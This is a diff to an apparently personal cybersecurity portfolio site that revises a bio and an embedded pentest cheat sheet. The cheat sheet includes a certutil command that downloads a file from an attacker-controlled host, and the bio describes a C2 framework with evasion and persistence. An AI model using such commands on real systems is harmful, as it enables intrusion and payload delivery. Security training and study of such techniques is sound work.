@@ -31,10 +31,10 @@
 │  Languages: C, Python, Go, PowerShell, Bash, JavaScript                      │
 │                                                                              │
 │  [ CURRENT WORK ]                                                            │
-│  • Cyber Deception Engineer @ Space Dynamics Lab (published researcher)      │
-│  • C2 framework w/ RL-based adaptive evasion bypassing Windows Defender      │
-│  • CTF challenge creator for BSides Utah competitions                        │
-│  • BS Cybersecurity (BYU-Idaho) | Security+, PenTest+, CySA+, AWS CP         │
+│  • Cynosure: Rust-based C2 framework with TUI console                        │
+│  • CTF challenge creator for BSides Utah (reverse eng & exploitation)        │
+│  • SOC analyst & course architect @ BYU-Idaho                                │
+│  • BS Cybersecurity | Security+, PenTest+, CySA+, AWS CP, PNPT (incoming)   │
 │                                                                              │
 │  [ ACHIEVEMENTS ]                                                            │
 │  HackUSU 2025: 3rd place cybersecurity | Rocky Mountain 2024: 5th place      │
@@ -357,7 +357,14 @@ certutil.exe -urlcache -f http://<lhost>/<filename> <name>
 GENERAL TRADECRAFT
 BurpSuite "Limit Scope" in proxy settings
 site:<url>, "text", AND, filetype:<ext>, -<not>
-git clone https://github.com/insidetrust/statistically-likely-usernames.git`
+git clone https://github.com/insidetrust/statistically-likely-usernames.git
+
+CYNOSURE C2 FRAMEWORK
+Rust-based command & control with dynamic payload delivery
+ratatui TUI interface for operator console
+Plugin-based modular architecture
+Adaptive evasion and persistence capabilities
+github.com/ConnorDedic/Cynosure`
 				};
 				const fullText = guides[this.selectedGuide] || guides[1];
 				this.currentPostLines = fullText.split('\n');
